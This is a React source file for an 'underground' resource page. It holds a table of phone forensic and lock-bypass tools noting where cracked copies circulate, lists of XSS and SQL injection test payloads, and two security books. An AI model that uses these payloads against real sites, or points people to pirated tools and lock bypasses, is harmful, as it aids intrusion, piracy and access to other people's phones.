import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { X } from 'lucide-react';

const UndergroundPage: React.FC = () => {
  const [showModal, setShowModal] = useState(false);
  const [selectedResource, setSelectedResource] = useState<Resource | null>(null);
  const [isRawView, setIsRawView] = useState(false);

  interface ForensicToolDetail {
    toolName: string;
    useCase: string;
    type: string;
    crackOrFree: string;
    os: string;
    remarks: string;
  }

  interface PayloadDetail {
    types: string[];
    examples: string[];
  }

  interface BookDetail {
    name: string;
    link: string;
    description: string;
  }

  interface Resource {
    name: string;
    type: string;
    verified: boolean;
    source: string;
    details: ForensicToolDetail[] | PayloadDetail | BookDetail[];
  }

  const resourcesData = {
    forensicTools: {
      name: 'Forensic Tools',
      type: 'Tools',
      verified: true,
      source: 'GitHub',
      details: [
        {
          toolName: 'Cellebrite UFED',
          useCase: 'Full data extraction, lock bypass, cloud data access',
          type: 'Paid',
          crackOrFree: 'Crack exists (VM images, torrents)',
          os: 'Win/Linux',
          remarks: 'Most used in law enforcement. Cracked VMs are shared privately.',
        },
        {
          toolName: 'MSAB XRY',
          useCase: 'Mobile device data recovery, full app data, timeline analysis',
          type: 'Paid',
          crackOrFree: 'Crack exists (2022+ editions leaked)',
          os: 'Windows',
          remarks: 'Swedish forensic tool, crack on darknet forums.',
        },
        {
          toolName: 'Oxygen Forensic Detective',
          useCase: 'Full data extraction, call/SMS/app data, GPS logs',
          type: 'Paid',
          crackOrFree: 'Crack exists',
          os: 'Windows',
          remarks: 'Crack versions shared in Russian and underground forums.',
        },
        {
          toolName: 'MOBILedit Forensic',
          useCase: 'Phone content analysis, recovery, unlock',
          type: 'Paid',
          crackOrFree: 'Cracked version known',
          os: 'Windows',
          remarks: 'Sometimes bundled with drivers, lock removal modules.',
        },
        {
          toolName: 'PassFab Android Unlocker',
          useCase: 'FRP bypass, lockscreen removal',
          type: 'Paid',
          crackOrFree: 'Cracked APKs and PC tools exist',
          os: 'Windows',
          remarks: 'Widely used in cracked forums. Works well on Samsung, LG.',
        },
        {
          toolName: 'Tenorshare 4uKey',
          useCase: 'Lock screen, pattern/PIN bypass',
          type: 'Paid',
          crackOrFree: 'Crack available',
          os: 'Windows/Mac',
          remarks: 'Used even in repair shops. Crack is usable.',
        },
        {
          toolName: 'iMyFone LockWiper',
          useCase: 'FRP and lockscreen bypass (Android/iOS)',
          type: 'Paid',
          crackOrFree: 'Crack exists',
          os: 'Windows',
          remarks: 'Clean bypass method. Crack works for many versions.',
        },
        {
          toolName: 'Octoplus FRP Tool',
          useCase: 'FRP bypass and IMEI repair',
          type: 'Paid',
          crackOrFree: 'Crack available',
          os: 'Windows',
          remarks: 'Samsung-focused. Full cracked bundles exist.',
        },
        {
          toolName: 'Z3X Samsung Tool Pro',
          useCase: 'FRP, flashing, IMEI, rooting, firmware write',
          type: 'Paid',
          crackOrFree: 'Cracked',
          os: 'Windows',
          remarks: 'Core tool in forensic boxes.',
        },
        {
          toolName: 'Miracle Box',
          useCase: 'MTK, Qualcomm phone servicing, FRP, flashing',
          type: 'Paid',
          crackOrFree: 'Cracked widely',
          os: 'Windows',
          remarks: 'Used in most shady phone service centers.',
        },
        {
          toolName: 'UMT Dongle (Ultimate Multi Tool)',
          useCase: 'FRP, reset, format, unlock, flash',
          type: 'Paid',
          crackOrFree: 'Crack leaked',
          os: 'Windows',
          remarks: 'Flashing + lock bypass.',
        },
        {
          toolName: 'Chinese Miracle 2 (InfinityBox)',
          useCase: 'Advanced chipset unlocks, dump, format',
          type: 'Paid',
          crackOrFree: 'Crack exists',
          os: 'Windows',
          remarks: 'Especially for Oppo, Vivo, Realme.',
        },
        {
          toolName: 'Hydra Tool',
          useCase: 'Qualcomm, MTK, SPD unlock and flash',
          type: 'Paid',
          crackOrFree: 'Crack available',
          os: 'Windows',
          remarks: 'Newer tool. Crack is hard to find but exists.',
        },
        {
          toolName: 'SP Flash Tool',
          useCase: 'Flash scatter files, reset, format MTK devices',
          type: 'Free',
          crackOrFree: 'Open Source',
          os: 'Win/Linux',
          remarks: 'Clean forensic use. Good for offline testing.',
        },
        {
          toolName: 'ADB + Fastboot',
          useCase: 'Shell access, format partitions, FRP wipe',
          type: 'Free',
          crackOrFree: 'Open Source',
          os: 'Win/Linux',
          remarks: 'Power combo for Android low-level access.',
        },
        {
          toolName: 'Andriller',
          useCase: 'Android forensic suite, screen bypass, pattern brute',
          type: 'Free',
          crackOrFree: 'Open Source',
          os: 'Windows/Linux',
          remarks: 'Script-based. Hidden gem for researchers.',
        },
        {
          toolName: 'AFLogical OSE',
          useCase: 'Logical Android dump (Cellebrite alt)',
          type: 'Open Source',
          crackOrFree: 'Yes',
          os: 'Linux',
          remarks: 'Made by viaSecure, good on rooted devices.',
        },
        {
          toolName: 'ADB Extractor (Custom Scripts)',
          useCase: 'Dumping raw data from locked phones',
          type: 'Open Source',
          crackOrFree: 'Yes',
          os: 'Linux',
          remarks: 'Write your own with adb pull + hexdump filters.',
        },
      ],
    },
    xssPayloads: {
      name: 'XSS Payloads',
      type: 'Payloads',
      verified: true,
      source: 'OWASP',
      details: {
        types: ['Basic', 'DOM', 'Stored'],
        examples: [
          '<script>alert(1)</script>',
          'javascript:alert(1)',
          '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
          '<audio src=1 href=1 onerror="javascript:alert(1)"></audio>',
          '<video src=1 href=1 onerror="javascript:alert(1)"></video>',
          '<body src=1 href=1 onerror="javascript:alert(1)"></body>',
          '<image src=1 href=1 onerror="javascript:alert(1)"></image>',
          '<object src=1 href=1 onerror="javascript:alert(1)"></object>',
          '<script src=1 href=1 onerror="javascript:alert(1)"></script>',
          '<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>',
          '<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>',
          '<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>',
          '<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>',
          '<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>',
          '<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>',
          '<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>',
          '<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>',
          '<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>',
          '<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>',
          '<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>',
          '<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>',
          '<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>',
          '<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>',
          '<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>',
          '<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>',
          '<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>',
          '<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>',
          '<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>',
          '<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>',
          '<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>',
        ],
      },
    },
    sqliPayloads: {
      name: 'SQLi Payloads',
      type: 'Payloads',
      verified: true,
      source: 'OWASP',
      details: {
        types: ['Union Select', 'Error-based', 'Blind'],
        examples: ['\' OR 1=1 --', '" OR "1"="1', 'admin\'--'],
      },
    },
    books: {
      name: 'Books',
      type: 'Resources',
      verified: true,
      source: 'Amazon',
      details: [
        {
          name: 'The Web Application Hacker\'s Handbook',
          link: 'https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470',
          description: 'A comprehensive guide to finding and exploiting security flaws in web applications, covering techniques like SQL injection, XSS, and more.',
        },
        {
          name: 'Black Hat Python',
          link: 'https://www.amazon.com/Black-Hat-Python-Programming-Hackers/dp/1593275900',
          description: 'A hands-on guide to writing Python scripts for security researchers and hackers, including network sniffing, exploit development, and more.',
        },
      ],
    },
  };

  const resources: Resource[] = Object.values(resourcesData);

  const openModal = (resource: Resource) => {
    setSelectedResource(resource);
    setShowModal(true);
    setIsRawView(false);
  };

  return (
    <div className="bg-dark-900 min-h-screen pt-28 pb-16">
      <div className="container">
        <div className="overflow-x-auto">
          <table className="w-full text-left border-collapse border border-dark-700">
            <thead>
              <tr className="border border-dark-700">
                <th className="p-3 text-sm font-medium text-dark-300 border border-dark-700">Item</th>
                <th className="p-3 text-sm font-medium text-dark-300 border border-dark-700">Index</th>
                <th className="p-3 text-sm font-medium text-dark-300 border border-dark-700">Verified</th>
                <th className="p-3 text-sm font-medium text-dark-300 border border-dark-700">Source</th>
              </tr>
            </thead>
            <tbody>
              {resources.map((resource, index) => (
                <tr key={index} className="border-b border-dark-700 hover:bg-dark-800 transition-colors">
                  <td className="p-3 text-white border border-dark-700">{resource.name}</td>
                  <td className="p-3 border border-dark-700">
                    <button
                      className="text-primary-400 hover:text-primary-300 transition-colors"
                      onClick={() => openModal(resource)}
                    >
                      View Details
                    </button>
                  </td>
                  <td className="p-3 text-white border border-dark-700">{resource.verified ? '✅' : '❌'}</td>
                  <td className="p-3 text-white border border-dark-700">{resource.source}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {showModal && selectedResource && (
          <motion.div
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.5, transition: { duration: 0.4, ease: 'easeInOut' } }}
            transition={{ duration: 0.3, ease: 'easeInOut' }}
            className="fixed inset-0 bg-dark-900/90 flex items-center justify-center p-4"
            onClick={() => setShowModal(false)}
          >
            <div
              className="bg-dark-800 rounded-lg p-6 w-[90vw] h-[80vh] overflow-y-auto scrollbar scrollbar-thumb-dark-600 scrollbar-track-dark-800 scrollbar-thumb-rounded-full scrollbar-track-rounded-full hover:scrollbar-thumb-dark-500 scrollbar-w-2"
              onClick={(e) => e.stopPropagation()}
            >
              <div className="flex justify-between items-center mb-4">
                <h2 className="text-xl font-bold text-white">{selectedResource.name}</h2>
                <div className="flex items-center space-x-2">
                  {(selectedResource.name === 'XSS Payloads' || selectedResource.name === 'SQLi Payloads') && (
                    <button
                      className="text-dark-300 hover:text-white transition-colors bg-dark-700 px-3 py-1 rounded-md text-sm"
                      onClick={() => setIsRawView(!isRawView)}
                    >
                      {isRawView ? 'Box View' : 'Raw View'}
                    </button>
                  )}
                  <button
                    className="text-dark-300 hover:text-white transition-colors"
                    onClick={() => setShowModal(false)}
                  >
                    <X className="h-6 w-6" />
                  </button>
                </div>
              </div>
              <div className="space-y-4">
                {selectedResource.name === 'Forensic Tools' ? (
                  <div className="overflow-x-auto">
                    <table className="w-full text-left border-collapse border border-dark-700">
                      <thead>
                        <tr className="border border-dark-700">
                          <th className="p-3 text-sm font-medium text-white bg-dark-700 border border-dark-700">Tool Name</th>
                          <th className="p-3 text-sm font-medium text-white bg-dark-700 border border-dark-700">Use Case</th>
                          <th className="p-3 text-sm font-medium text-white bg-dark-700 border border-dark-700">Type</th>
                          <th className="p-3 text-sm font-medium text-white bg-dark-700 border border-dark-700">Crack/Free?</th>
                          <th className="p-3 text-sm font-medium text-white bg-dark-700 border border-dark-700">OS</th>
                          <th className="p-3 text-sm font-medium text-white bg-dark-700 border border-dark-700">Remarks</th>
                        </tr>
                      </thead>
                      <tbody>
                        {(selectedResource.details as ForensicToolDetail[]).map((tool, index) => (
                          <tr key={index} className="border border-dark-700 hover:bg-dark-750">
                            <td className="p-3 text-white border border-dark-700">{tool.toolName}</td>
                            <td className="p-3 text-white border border-dark-700">{tool.useCase}</td>
                            <td className="p-3 text-white border border-dark-700">{tool.type}</td>
                            <td className="p-3 text-white border border-dark-700">{tool.crackOrFree}</td>
                            <td className="p-3 text-white border border-dark-700">{tool.os}</td>
                            <td className="p-3 text-white border border-dark-700">{tool.remarks}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                    <p className="text-sm text-dark-400 mt-4 text-center">
                      Compiled for educational research use only. Always comply with legal and ethical standards.
                    </p>
                  </div>
                ) : selectedResource.name === 'Books' ? (
                  <div className="overflow-x-auto">
                    <table className="w-full text-left border-collapse border border-dark-700">
                      <thead>
                        <tr className="border border-dark-700">
                          <th className="p-3 text-sm font-medium text-white bg-dark-700 border border-dark-700">Book Name</th>
                          <th className="p-3 text-sm font-medium text-white bg-dark-700 border border-dark-700">Link</th>
                          <th className="p-3 text-sm font-medium text-white bg-dark-700 border border-dark-700">Description</th>
                        </tr>
                      </thead>
                      <tbody>
                        {(selectedResource.details as BookDetail[]).map((book, index) => (
                          <tr key={index} className="border border-dark-700 hover:bg-dark-750">
                            <td className="p-3 text-white border border-dark-700">{book.name}</td>
                            <td className="p-3 text-white border border-dark-700">
                              <a
                                href={book.link}
                                target="_blank"
                                rel="noopener noreferrer"
                                className="text-primary-400 hover:text-primary-300 transition-colors"
                              >
                                View on Amazon
                              </a>
                            </td>
                            <td className="p-3 text-white border border-dark-700">{book.description}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                    <p className="text-sm text-dark-400 mt-4 text-center">
                      Links provided for educational purposes. Always purchase books through legitimate sources.
                    </p>
                  </div>
                ) : (
                  <div className="text-white">
                    <h3 className="font-medium mb-2">Details:</h3>
                    {selectedResource.name === 'XSS Payloads' || selectedResource.name === 'SQLi Payloads' ? (
                      isRawView ? (
                        <div className="space-y-4">
                          <div>
                            <h4 className="font-medium mb-2">Types:</h4>
                            <pre className="bg-dark-800 text-white text-sm p-3 rounded-md whitespace-pre-wrap break-words">
                              {(selectedResource.details as PayloadDetail).types.join('\n')}
                            </pre>
                          </div>
                          <div>
                            <h4 className="font-medium mb-2">Examples:</h4>
                            <pre className="bg-dark-800 text-white text-sm p-3 rounded-md whitespace-pre-wrap break-words">
                              {(selectedResource.details as PayloadDetail).examples.join('\n')}
                            </pre>
                          </div>
                        </div>
                      ) : (
                        <div className="space-y-4">
                          <div>
                            <h4 className="font-medium mb-2">Types:</h4>
                            <div className="space-y-2">
                              {(selectedResource.details as PayloadDetail).types.map((type, index) => (
                                <div key={index} className="bg-dark-800 border border-dark-700 rounded-md p-3">
                                  <pre className="text-white text-sm overflow-x-auto">{type}</pre>
                                </div>
                              ))}
                            </div>
                          </div>
                          <div>
                            <h4 className="font-medium mb-2">Examples:</h4>
                            <div className="space-y-2">
                              {(selectedResource.details as PayloadDetail).examples.map((example, index) => (
                                <div key={index} className="bg-dark-800 border border-dark-700 rounded-md p-3">
                                  <pre className="text-white text-sm overflow-x-auto">{example}</pre>
                                </div>
                              ))}
                            </div>
                          </div>
                        </div>
                      )
                    ) : null}
                  </div>
                )}
              </div>
            </div>
          </motion.div>
        )}
      </div>
    </div>
  );
};

export default UndergroundPage;